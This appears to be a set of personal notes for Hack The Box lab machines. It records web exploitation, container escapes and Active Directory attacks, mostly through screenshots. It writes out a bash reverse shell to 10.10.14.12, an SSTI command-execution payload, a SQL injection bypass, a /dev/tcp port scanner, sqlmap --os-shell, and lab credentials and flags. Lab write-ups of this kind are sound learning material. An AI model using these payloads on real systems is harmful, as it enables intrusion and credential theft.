![[Pasted image 20250106170023.png]]
I found two forms, one to log in, and another that is an for an invitation code
![[Pasted image 20250106170201.png]]
![[Pasted image 20250106170209.png]]
While I hack the invitation code, Ill make a dirbuster
![[Pasted image 20250106170633.png]]'So, hence the code,
![[Pasted image 20250106170659.png]]
I found the function that validates the invitation code
![[Pasted image 20250106171448.png]]
As seen, there is also the code where the inv code is created
![[Pasted image 20250106174221.png]]So back in the /invite directory I found the function
![[Pasted image 20250106174436.png]]
And it actually says that they are usign ROT13, so
![[Pasted image 20250106174545.png]]
So, lets make that request
![[Pasted image 20250106174646.png]]
And we have it
![[Pasted image 20250106174802.png]]
Perfect, now are logged in, so we can make another enumeration
![[Pasted image 20250106175226.png]]
There is nothing new by being authenticated, the only thing that caugth my attention is the /api endpoint, so lets enumerate it
The api enumeration did not returned nothing usefull
But if we use the /api endpoint we ahve some info
![[Pasted image 20250106182831.png]]
The endpoint /api/v1/admin/settings/update is interesting, so lets try it
![[Pasted image 20250106184207.png]]
Once I change the Content Type
![[Pasted image 20250106184244.png]]
![[Pasted image 20250106185237.png]]
And it appears that I changed my account to admin
![[Pasted image 20250106185336.png]]
So, now my account is set as admin, I downloaded the vpn connection to see if there is any I can do with that
There is nothing I can do with the VPN connection from the page, but I remember that there is an endpoint that is under admin privileges, and since now I have those privileges Ill try there
![[Pasted image 20250106190825.png]]
![[Pasted image 20250106190939.png]]
This creates a VPn connection for the username that we provide, and it does not check if it exists
![[Pasted image 20250106191102.png]]
We can inject commands
![[Pasted image 20250106191208.png]]
So, lets try a reverse shell
![[Pasted image 20250106191539.png]]
![[Pasted image 20250106191657.png]]
#### Priv Esc
![[Pasted image 20250106192241.png]]
![[Pasted image 20250106192404.png]]
Lets try if this pass is reused `SuperDuperPass123`
![[Pasted image 20250106192556.png]]

We have the user flag `46c82963ea28d481be1cbd623949df2d`
Now, I havent found any SUID file nor permision as sudo
But by enumerating the OS I found that the kernel has an known CVE
![[Pasted image 20250106193122.png]]
![[Pasted image 20250106193128.png]]
https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/#how-the-cve-2023-0386-vulnerability-works

I used this exploit
https://github.com/puckiestyle/CVE-2023-0386

I transfered from my machine to the victim using an http server

And we are root
![[Pasted image 20250106194240.png]]
flag `c7879db1fc7774e7c2dd6c79d3686ae0`

### GreenHorn✅
#### Initial Access
![[Pasted image 20250114143924.png]]
I had to add the domain to the /etc/hosts binary
At first glance various things catch my eye
![[Pasted image 20250114150450.png]]
We can try for directory listing, path traversal, search for pluck, and we can see that is written in PHP.
We also have this gitea in the port 3000
![[Pasted image 20250114150847.png]]
![[Pasted image 20250114151033.png]]
Doing a quick search for "Pluck CMS" we have some vulnerability disclosed, CVE-2023-25828
In parallel I created an account in the Gitea, and found a valid username for login in
![[Pasted image 20250114152336.png]]
I found the following inside the repository
![[Pasted image 20250114152909.png]]
It seems like a hashed password
![[Pasted image 20250114152939.png]]
![[Pasted image 20250114152953.png]]
Lets try if we can use this password somewhere
![[Pasted image 20250114162654.png]]
The password was valid in the /login.php panel
![[Pasted image 20250114162001.png]]
![[Pasted image 20250114162058.png]]
As we can see, we have a 4.7.18 version of pluck, this is a vulnerable version
![[Pasted image 20250114162207.png]]
https://www.exploit-db.com/exploits/51592
I found the page that has the file upload form
![[Pasted image 20250114163159.png]]
![[Pasted image 20250114165552.png]]
I will use the reverse shell and exploit from the following repo
https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC
Once uploaded and executed
![[Pasted image 20250114173041.png]]
![[Pasted image 20250114173100.png]]
Since the user reused the password, we can move horizontally
![[Pasted image 20250114173759.png]]
#### Priv Esc
After enumerating wuth the user `junior` the only thing that catches my eye is the pdf in his home directory, I used find / -perm 4000, sudo -l , ps and nothing useful was there
So I started an http server to download this pdf
![[Pasted image 20250114174727.png]]
![[Pasted image 20250114174801.png]]
This is the content of the PDF file
![[Pasted image 20250114174932.png]]
Doing some research I found a repo called Depix, this is a project to depixalate these kind of redactions
[GitHub - spipm/Depixelization_poc: Depix is a PoC for a technique to recover plaintext from pixelized screenshots.](https://github.com/spipm/Depixelization_poc)
So I took a screenshot from the PDF and cropped the photo
![[Pasted image 20250114175832.png]]
![[Pasted image 20250114180053.png]]
I could not make this work, the image was not clear, ill have to take a look to this writeup
[GreenHorn | ryuki's blog](https://blog.ryuki.dev/ctf/htb/machines/greenhorn)

The password is  `sidefromsidetheothersidesidefromsidetheotherside`

So we rooted
![[Pasted image 20250114180516.png]]
`76feec59d67717abbc3b74f000796f80`

### Good Games ✅
#### Initial Access
![[Pasted image 20250122171342.png]]
![[Pasted image 20250122171601.png]]
We have a Login portal as the most important page
![[Pasted image 20250122171749.png]]
So I created an account to see what we have
![[Pasted image 20250122171909.png]]
There is nothing important at first sight
' or 1=1 -- -
Trying these simple SQLi I found the following, and appears to be vulnerable
![[Pasted image 20250122172854.png]]
But If we used it in the email field
![[Pasted image 20250122172944.png]]
And this seems to log us as admin
I had to add the domain so the page loads properly
![[Pasted image 20250122173947.png]]
Perfect, since this input is vulnerable, we can try and extract info from the DB
Ill be using SQL map to exploit this
So I saved the request to this file
And fired SQLmap
![[Pasted image 20250122182442.png]]
![[Pasted image 20250122182504.png]]
Once I found the db name I started dumping all data
![[Pasted image 20250122184022.png]]
Finally, after sometime, I found the following passwords, one belongs to the user I created
So Ill try and crack this pass since looks like a md5 hash
![[Pasted image 20250122185514.png]]
And yes, we have it
![[Pasted image 20250122185550.png]]So, perfect, we have the admin pass, so we can now access the second page
![[Pasted image 20250122185732.png]]
perfect, we are inside this second panel
![[Pasted image 20250122185935.png]]
Lets see what we have
![[Pasted image 20250122190135.png]]
In the profile I have some input fields
This changes our profile card
![[Pasted image 20250122190233.png]]
This site is using python and flask as programming language, so lets try something
![[Pasted image 20250122190741.png]]
And yes, this site is vulnerable to STTI
![[Pasted image 20250122190924.png]]
So lets find how to execute at system level
Now using this oneliner lets establish a reverse shell
`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
![[Pasted image 20250122193223.png]]
![[Pasted image 20250122193234.png]]
![[Pasted image 20250122193425.png]]
For the looks we seem to be in a docker container, we can see that the hostname and the network created is like the defaults from docker
![[Pasted image 20250122232035.png]]
We need to scan the network to see if there is something to do, since there is no other way

##### Port scanner
`(echo '' > /dev/tcp/<ip_address>/<port>) 2>/dev/null && echo “[*] Port open” || echo “[*] Port closed”`

using this one liner i created a port scanner
![[Pasted image 20250122234258.png]]
This is a mistake, i used the ip .2 and I should use the .1 for the hsot machine
![[Pasted image 20250123002411.png]]
I wanted to use ssh with the account admin but do not exists
I found another username in the container
![[Pasted image 20250123002745.png]]
![[Pasted image 20250123002834.png]]
Maybe lets try this username and the pass we have
Before this I tried copying the bash binary and setting the SUID bit to it, so if we can use augustus well have how escalate privileges
![[Pasted image 20250123003130.png]]
We are now suer augustus in the host machine, so we broke out from the container
#### Priv Esc
I was wrong with the bash, I had to copy th bash binary as augustus in the host machine, and then as root in the container I set the SUID bit
![[Pasted image 20250123004351.png]]
I was not able to do this and then I realized that I had to assign the owner of the binary and then the permissions
![[Pasted image 20250123005359.png]]

### Tool Box✅
#### Initial Access
![[Pasted image 20250123135944.png]]
So, we have a windows machine, lets begin with the enumeration of the services
We have anon login as shown by nmap scan
![[Pasted image 20250123140430.png]]
It only has and .exe which appears to be the docker Toolbox installer
The we have an webpage on port 443
This page seems to be hosted on an UNIX system so, having in mind that maybe there is docker installed, this page could be in a container
![[Pasted image 20250123141351.png]]
We have this info in the certificate
![[Pasted image 20250123143316.png]]
We have this login panel
![[Pasted image 20250123143616.png]]
Lets analyze this in burp
![[Pasted image 20250123144047.png]]
It appears to be vulnerable to SQLi
![[Pasted image 20250123144445.png]]
![[Pasted image 20250123144908.png]]
After sometime, i realized that if we try this in the username input we have a redirection
![[Pasted image 20250123145850.png]]
And we byppassed the login page
![[Pasted image 20250123145913.png]]
There is nothing in this dashboard, so lets use sqlmap and see wwaht we got
To save the request from burp
![[Pasted image 20250123152108.png]]
And we use this request in SQLMap
![[Pasted image 20250123152212.png]]
Perfect, we have the different vulnerabilities
![[Pasted image 20250123152438.png]]
We got the hash for the admin password
![[Pasted image 20250123152924.png]]
So now lets try and crack it, since we know is an md5 hash from the recon
After a long time, since I could advance, I look at the walkthroug and so I discovered a function from SQLMap to execute os commands
using
`sqlmap -r request.req --force-sql --os-shell`
This allows to give an os command, so we can use a reverse shell
`bash -c 'bash -i &> /dev/tcp/10.10.14.12/4444 0>&1'`
Perfect, we have our reverse shell
![[Pasted image 20250123164048.png]]
Since we are in a container I used a portscanner with bash to see of there is another open ports
![[Pasted image 20250123165659.png]]
so apparently toolbox has the default credential docker:tcuser
And this works
Once we are in the host machine we can change to the root user without passwd
find / -name root.txt 2>/dev/null
![[Pasted image 20250123173119.png]]

### Buff✅
#### Initial Access
![[Pasted image 20250128155547.png]]
![[Pasted image 20250128160525.png]]
![[Pasted image 20250128160755.png]]
It appears to be some gym management system
This system has a known vulnerability as we can find in exploit db
https://www.exploit-db.com/exploits/48506
I had to use python 2.7 to work
Finally i uploaded the nc.exe binary so I can have a proper reverse shell
![[Pasted image 20250128165721.png]]
![[Pasted image 20250128165921.png]]
#### Priv Esc
The only insteresting binary found is this CloudMe_1112.exe
![[Pasted image 20250128170737.png]]
This is an enterprise cloud software, and I found some vulnerabilities that take advantages of a Buffer overflow
So this has a service running in the localhost port 8888, this is the default port for this service
We can confirm this by `netstat -an | findstr "LISTENING"`
![[Pasted image 20250128171620.png]]
At this point im kinda lost, so I watch the walkthrough of S4vitaar
https://www.youtube.com/watch?v=TytUFooC3kU
So, now we need to tunnel the connections since the service is running in the windows localhost, so to access it we should go from our attacker machine -> to victim machine -> localhost service port 8888, so we can exploit this version of Cloud Me
So for this I will use chisel
Now I had to download the binaries of chisel for win and linux, to run both one in server mode and the other in client mode
![[Pasted image 20250128190913.png]]
So we have running the chisel server, now we need the client on the windows machine and forward the 8888 port through the tunnel
This is how we forward our port 8888 to the 8888 port in our server machine
![[Pasted image 20250128192031.png]]
![[Pasted image 20250128192042.png]]
Now I'll use the following exploit for the BoF
https://www.exploit-db.com/exploits/48389
![[Pasted image 20250128192723.png]]
I have to change the shellcode to establish another reverse shell, so using msfvenom
![[Pasted image 20250128193310.png]]
I used the -v flag to change the name of the variable
![[Pasted image 20250128194240.png]]
![[Pasted image 20250128194556.png]]

### Sauna✅
![[Pasted image 20250131182445.png]]
We have some company names
![[Pasted image 20250131182626.png]]
![[Pasted image 20250131184003.png]]
These hints can make us think that we are facing a Domain Controler
![[Pasted image 20250131184813.png]]
```
LDAP
ldapsearch

SMB
crackmapexec
smbmap
smbclient

RPC
rcpclient
```
So I had to see S4vitaar's video, since I was lost, so now, I am using hacktricks to enumerate the ldap service
https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html?highlight=389#389-636-3268-3269---pentesting-ldap
Here we have the naming contexts
![[Pasted image 20250131190336.png]]
Now using the naming context I can enumerate more information 
And now I've got a whole lot more information
![[Pasted image 20250131190559.png]]
Something that caught my attention is a name
So lets narrow the search
![[Pasted image 20250131190646.png]]
Now we have a name there, these could be a valid username
So I created a list of possible combination
![[Pasted image 20250131190902.png]]
Now Ill use a tool called kerbrute
https://github.com/ropnop/kerbrute
![[Pasted image 20250131191513.png]]
![[Pasted image 20250131191839.png]]
We have a valid username
But we can also use the names found in the webpage to expand our list
![[Pasted image 20250131192736.png]]
And we have a two usernames and a TGT hash to crack
![[Pasted image 20250131192915.png]]
![[Pasted image 20250131193328.png]]
Now we have the hash, lets crack it
With hashcat I found the mode we need to user to crack it
![[Pasted image 20250131193857.png]]
And done, we have it
`hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt`
![[Pasted image 20250131194042.png]]
`fsmith:Thestrokes23`
Now I used evilWinRM to access the machine
![[Pasted image 20250131195045.png]]
So using an http server I uploaded the WinPEAS binary
![[Pasted image 20250131202226.png]]
![[Pasted image 20250131203456.png]]
![[Pasted image 20250131203538.png]]
So, we need to use bloodhound for this, and I dont even know how to do it
To install use `apt install neo4j bloodhound`
![[Pasted image 20250131205139.png]]
First I need to make a change and use java 11
![[Pasted image 20250131205324.png]]
![[Pasted image 20250131205500.png]]
Once we create this user and pass we can open bloodhound
![[Pasted image 20250131205731.png]]
![[Pasted image 20250131205801.png]]
Now we need to collect all the victim's system information, for this we will use a PS script
https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1
![[Pasted image 20250131214104.png]]
![[Pasted image 20250131214310.png]]
![[Pasted image 20250131214418.png]]
Now we upload this zip to bloodhound
I cant use bloodhound, I have some errors unzipping the data
usign the video I found that we can make a DCSync attack
![[Pasted image 20250131220412.png]]
This could be done by Using Mimikatz or impacket-secretsdump
This would end in a Pass The Hash attack
![[Pasted image 20250131220738.png]]
This is the output of impacket
Now to make the pass the hash 
If we use impacket-psexec and the hash NT
![[Pasted image 20250131221331.png]]
We have now access as NT auth system
![[Pasted image 20250131221417.png]]
### OpenSource ✅
#### Initial Access
I've already started this machine so I'll explain and continue it from where I left it
First, during the enumeration I found only two services exposed from the machine, port 22 and 80,
so I entered the webpage and it appears that is a file sharing system, so enumerating the web we have an upload functionality, this functionality once we upload the file gives us the path. We also have the source code of the application so we can explore that. By exploring the code I found a password in previous commits of the .git and the upload function that appears to be vulnerable.
![[Pasted image 20250218111914.png]]
![[Pasted image 20250218112003.png]]
![[Pasted image 20250218114313.png]]
![[Pasted image 20250218114525.png]]
![[Pasted image 20250218114821.png]]
`dev01:Soulless_Developer#2022@10.10.10.128:5187`
I'm thinking that I can use the vulnerability in the upload function
![[Pasted image 20250218120157.png]]
I added this to the functions, and Ill try to upload this new views.py, this could work since the `get_files_name` does no ensures if the file exists and we will be able to overwrite the views.py
![[Pasted image 20250218121850.png]]
![[Pasted image 20250218122204.png]]
This did not worked since what we need to do is to only specify the path 
![[Pasted image 20250218123403.png]]
Since that bash did not worked Ill try this one new
![[Pasted image 20250218123832.png]]
![[Pasted image 20250218153200.png]]
![[Pasted image 20250222184333.png]]
At this point I am so lost I had to look at a walkthrough
https://www.youtube.com/watch?v=Be5wJyhgB_A
it seems that we need to exploit the debug console of werkzug
This is done using this guide
https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html?highlight=werkzeug#werkzeug-console-pin-exploit
basically the foothold is that we can create the PIN needed to use the debug console
![[Pasted image 20250222201857.png]]
With the python3 script we can create the using some of the infomation we can gather via LFi or the machine itself
We can change the public info like the `username` and the `getattr(mod, '__file__', None)`

![[Pasted image 20250222202710.png]]
This is the value we need as is disclosed in the filename 
Now the private bits, we can get those by exploiting the machine connection or the LFI
As we have been told in the guide, we can get the MAC address and we need to convert it to decimal
![[Pasted image 20250222203131.png]]
Now for the second bit
The /etc/machine-id does not exists so, we need to use the second option and concatenate the two values
![[Pasted image 20250222203439.png]]
Now with all of these we can generate the PIN
Lets see
![[Pasted image 20250222203544.png]]
And we got it 
![[Pasted image 20250222203706.png]]
Since we are in a container we could scan for more open ports from the container to the host machine
Since the alpine linux has not the tcp directory, I found that we can scan with netcat
![[Pasted image 20250222211706.png]]
at this time ill use chisel to tunelize and scan these ports
![[Pasted image 20250222215213.png]]
![[Pasted image 20250222215222.png]]
This is how I use chisel, the server is configured via the port 9000 as a reverse proxy, and in the client we forward the localhost:3000 to the port 3000
So now we can scan the port with nmap
I had an error here, and I had to forward the port 3000 of the host, so the IP is not the localhost but the 172.17.0.1
![[Pasted image 20250222215805.png]]
And with this forwarding we now have access to that page
![[Pasted image 20250222215902.png]]
In this page we can access as the user `dev01` using the previous credentials we found in the logs of the .git
We have the backup of the directory of the user dev01
This means that we have the .ssh priv key
![[Pasted image 20250222221237.png]]
We are inside
![[Pasted image 20250222221740.png]]
#### Priv Esc
Ill use this script to detect some cronjobs, since after the recon did not found anything
![[Pasted image 20250222223139.png]]
This is what we have
![[Pasted image 20250222224451.png]]
Since this script executed by root does this
![[Pasted image 20250222230258.png]]
And it is using the `date` binary, I could create a new malicious binary and add the path of this binary to the env variable $PATH
![[Pasted image 20250222230239.png]]
This is the new binary, it will establish a reverse priv shell
![[Pasted image 20250222230755.png]]
![[Pasted image 20250222230818.png]]
This is not working, so I had to use another way, it seems that we can exploit the usage of git as its being executed as root
Since we have a .git directory in our home, anytime the actions on git are executed it triggers something called pre-commit, this are simple scripts
![[Pasted image 20250222232307.png]]
Now using this scripts, we can get execution as the user commiting the files to the repo, in this case, root
![[Pasted image 20250222232511.png]]
https://gtfobins.github.io/gtfobins/git/
We need to add this to the .git/hooks directory
![[Pasted image 20250222232752.png]]
Adding the precommit and giving exec permissions
![[Pasted image 20250222233111.png]]
Now we should gain SUID access to the bash anytime
![[Pasted image 20250222233157.png]]
![[Pasted image 20250222233659.png]]
![[Pasted image 20250222233728.png]]
### Active ✅
#### Initial Access
![[Pasted image 20250224171139.png]]
![[Pasted image 20250224171158.png]]
![[Pasted image 20250224171216.png]]
![[Pasted image 20250224182331.png]]
After some recon It appears we have some info in the shares, we have a Groups.xml
![[Pasted image 20250224192353.png]]
This is a password for the user SVC_TGS, after some search I find out that this is encripted by the GPP `Group Policy Password`
![[Pasted image 20250224192926.png]]
GPPstillStandingStrong2k18
![[Pasted image 20250224194926.png]]
#### priv esc
![[Pasted image 20250224233431.png]]
![[Pasted image 20250224233628.png]]
We have an interesting group, `Domain Admins 0x200` which has only one user
![[Pasted image 20250224233819.png]]
using Impacket tools
![[Pasted image 20250224235519.png]]
I found that the Administrator account has an SPN (https://books.spartan-cybersec.com/cpad/vulnerabilidades-y-ataques-en-ad/kerberoasting/utilizando-impacket-getuserspns) configured
With this I dumped the TGS for the Administrator Account
![[Screenshot 2025-02-25 000107.png]]Now we can try and crack the hash
![[Pasted image 20250225000601.png]]
Using john and the rockyou wordlist
![[Pasted image 20250225001519.png]]Now using impacket-psexec we have a cmd
![[Pasted image 20250225002156.png]]

### Support ✅
#### Initial Access
![[Pasted image 20250227161128.png]]
Using ldapsearch
![[Pasted image 20250227164512.png]]
![[Pasted image 20250227164840.png]]
We dont have so much info here
![[Pasted image 20250227164927.png]]
And with RPCclient we cant access anonymously
![[Pasted image 20250227170140.png]]
This is what we have in the share
Inside the zip we have
![[Pasted image 20250227170418.png]]
Using this hint
![[Pasted image 20250227170718.png]]
Using Strings we have a little more info
![[Pasted image 20250227171124.png]]
We can see more strings using the encoding flag
![[Pasted image 20250227171243.png]]
As we can see we have a potential username support\ldap
I had to follow the walkthrough to use ILSpy, this is a .net decompiler
![[Pasted image 20250301002615.png]]
With this decompiler
![[Pasted image 20250301002926.png]]
We have this as the function that encripts the password
![[Pasted image 20250301004858.png]]
It seems that this is making a b64 decode and then a decodes the result with an XOR a key and the byte 0xDF
So I converted the C# code to python using chatgpt
```python3
import base64

def decrypt_password(enc_password, key):
    array = base64.b64decode(enc_password)
    key_bytes = key.encode()  # Convierte la clave en bytes
    decrypted_bytes = bytearray(len(array))

    for i in range(len(array)):
        decrypted_bytes[i] = (array[i] ^ key_bytes[i % len(key_bytes)]) ^ 0xDF

    return decrypted_bytes

# Datos proporcionados
enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = "armando"

# Desencriptar
decrypted = decrypt_password(enc_password, key)
print(decrypted.decode(errors="ignore"))  # Intenta decodificar a texto legible

#El método que estás usando es una **cifrado por #XOR con clave repetitiva**, combinado con una #transformación adicional de XOR con `0xDF`.
#
#
```
And this is the password
![[Pasted image 20250301010016.png]]
`nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`
Now if we try to use the binary we cant because we need to add the hostname to /etc/hosts
So, we have the username support\ldap and a password
It seems that the password is correct
![[Pasted image 20250301010958.png]]
After trying to use evilwinrm or crackmapexec, we appear to not be in the remote management group with this user
So lets try enumerating other services as RPC
To access to RPC remember to user `user%password`
![[Pasted image 20250301012143.png]]
This are all domain users
And in the domain admins group we only have the administrator account
![[Screenshot 2025-03-01 012348.png]]So, we can create a valid user dictionary
![[Screenshot 2025-03-01 012732.png]]
![[Screenshot 2025-03-01 013401.png]]
We validated the users
The password is not re used
![[Pasted image 20250301014310.png]]
So enumerating ldap we have too much info to analyze, but from the binary we have the user support that we can validate using kerbrute
This is the ldap enumeration
![[Pasted image 20250301015321.png]]
And here we validate the common usernames
![[Pasted image 20250301015628.png]]
We have all the support info
![[Screenshot 2025-03-01 015805.png]]
We have the info field with something like a password `Ironside47pleasure40Watchful`
![[Pasted image 20250301020150.png]]
Perfect, we can access with evilwinrm
![[Pasted image 20250301020436.png]]
`687c0cdd22303c8e4b91b15a232bf89e`
#### Priv Esc
Im going to try and use Bloodhound
So I have to collect the AD info, an for this Ill use ADRecon.ps1 script
![[Pasted image 20250304213011.png]]
To use bloodhound GUI use apt install neo4j bloodhound
And do some config
Run neo4j
![[Pasted image 20250304222634.png]]
Then enter the webpage in localhost:7474
![[Pasted image 20250304225307.png]]
Access using user and pass neo4j, then we have to change the password
Once this is done, we can open bloodhound and use this credentials
![[Pasted image 20250304225431.png]]
![[Pasted image 20250304225501.png]]
After 3000 years, I am using bloodhound-pytohn to collect data
Pay attention to subdomains, such as, dc.support.htb, I had to add this subdomain to the /etc/hosts file
![[Pasted image 20250305002629.png]]
With this data in Bloodhound, we can see that the user support is in a group called shared support accounts
![[Pasted image 20250305003253.png]]
And this group has the following privileges over the dc.support.htb server
![[Pasted image 20250305003418.png]]
To continue I need to read this, and understand it
THIS MACHINE IS NOT EASY
https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html
Following the hacktricks guide
First Ill need the Powermad script
https://raw.githubusercontent.com/Kevin-Robertson/Powermad/refs/heads/master/Powermad.ps1
Then we create a new machine called SERVICEA with password 123456
![[Pasted image 20250305174356.png]]
Then with PowerView tools, we can check and enumerate the AD
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1
![[Pasted image 20250305180317.png]]
Then we need to add our new computer to the victim computer (DC) as a trusted delegate
![[Pasted image 20250305180752.png]]
At this point everything should be configured, and we can use the impacket rbcd tool
![[Pasted image 20250305181712.png]]I had to create again the computer and configure it since it wasnt listed on the LDAP directory
we have now our ST
![[Pasted image 20250305184607.png]]
Now with this TGT, we set it to a variable to the use it with impacketpsexec
![[Pasted image 20250305185347.png]]
And with psexec we are in
![[Pasted image 20250305185446.png]]
9c13f1e593d9f88013f06b1c40e38d4b